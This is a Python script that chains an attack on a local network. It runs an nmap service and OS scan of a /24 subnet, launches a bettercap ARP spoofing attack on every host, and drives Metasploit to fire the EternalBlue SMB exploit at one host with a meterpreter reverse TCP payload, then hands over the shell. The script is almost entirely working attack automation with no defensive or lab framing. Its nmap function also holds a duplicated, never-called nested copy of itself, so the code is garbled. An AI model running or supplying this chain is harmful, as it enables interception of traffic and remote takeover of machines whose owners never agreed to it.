import subprocess
import nmap
import pexpect

print("Starting Python script...")

def nmap_scan():
    print("Running nmap scan...")
    scanner = nmap.PortScanner()
    print("Nmap Scanning...")
    scanner.scan('192.168.1.0/24', arguments='-sV -O')
    hosts = scanner.all_hosts()
    def nmap_scan():
        try:
            scanner = nmap.PortScanner()
            print("Nmap Scanning...")
            scanner.scan('192.168.1.0/24', arguments='-sV -O')
            hosts = scanner.all_hosts()
            
            if not hosts:
                print("No hosts found")
                return None
                
            for host in hosts:
                try:
                    print(f"Host: {host}")
                    print(f"State: {scanner[host].state()}")
                    for proto in scanner[host].all_protocols():
                        print(f"Protocol: {proto}")
                        lport = scanner[host][proto].keys()
                        for port in lport:
                            print(f"Port: {port}\tService: {scanner[host][proto][port]['name']}")
                except KeyError as e:
                    print(f"Error processing host {host}: {e}")
                    
            return scanner
        except nmap.PortScannerError as e:
            print(f"Nmap scan failed: {e}")
            return None
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            return None
    
    for host in hosts:
        print(f"Host: {host}")
        print(f"State: {scanner[host].state()}")
        for proto in scanner[host].all_protocols():
            print(f"Protocol: {proto}")
            lport = scanner[host][proto].keys()
            for port in lport:
                print(f"Port: {port}\tService: {scanner[host][proto][port]['name']}")

    return scanner

def bettercap_attack():
    print("Running bettercap attack...")
    print("Starting bettercap ARP spoofing attack...")
    cmd = "bettercap -eval \"set arp.spoof.fullduplex true; set arp.spoof.targets 192.168.1.0/24; arp.spoof on\""
    subprocess.run(cmd, shell=True)
    print("Attack completed.")
    
def metasploit_exploit():
    print("Running metasploit exploit...")
    print("Launching metasploit console...")
    child = pexpect.spawn("/usr/bin/msfconsole")
    
    child.expect("msf>")
    child.sendline("use exploit/windows/smb/ms17_010_eternalblue")
    child.expect("ms17_010_eternalblue")
    
    child.sendline("set RHOST 192.168.1.100")
    child.expect("RHOST =>")
    
    child.sendline("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
    child.expect("PAYLOAD =>")
    
    child.sendline("exploit")
    child.expect("Meterpreter session")
    print("Exploit successful! Meterpreter session opened.")
    
    child.interact()

# Call each function to test
print("Calling nmap_scan()...")
nmap_scan()
print("Calling bettercap_attack()...")
bettercap_attack()
print("Calling metasploit_exploit()...")
metasploit_exploit()
